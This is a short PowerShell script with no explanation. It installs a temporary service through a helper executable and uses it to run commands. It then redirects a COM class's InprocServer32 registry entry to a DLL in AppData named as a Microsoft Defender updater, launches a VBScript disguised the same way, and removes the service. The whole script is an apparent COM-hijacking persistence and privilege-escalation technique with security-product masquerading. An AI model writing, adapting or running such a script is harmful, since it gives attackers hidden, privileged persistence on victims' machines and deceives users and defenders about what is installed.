$svc = ".\sysme.exe"
$regPath = "SOFTWARE\Classes\CLSID\{47E30D54-DAC1-473A-AFF7-2355BF78881F}\InprocServer32"
$newValue = Join-Path $env:APPDATA "Microsoft\Defender\1.0.3\ms_defender_updater.dll"
$setreg = ".\SetRegistryValue.exe"
$cmd = { param($c) & $svc --run "cmd.exe /c cd `"$PWD`" && $c" }
& $svc --install-service
& $cmd "$setreg `"$regPath`" `"$newValue`""
Start-Process wscript.exe "msdefender_updater_v1.0.3.vbs" -Wait
& $svc --remove-service
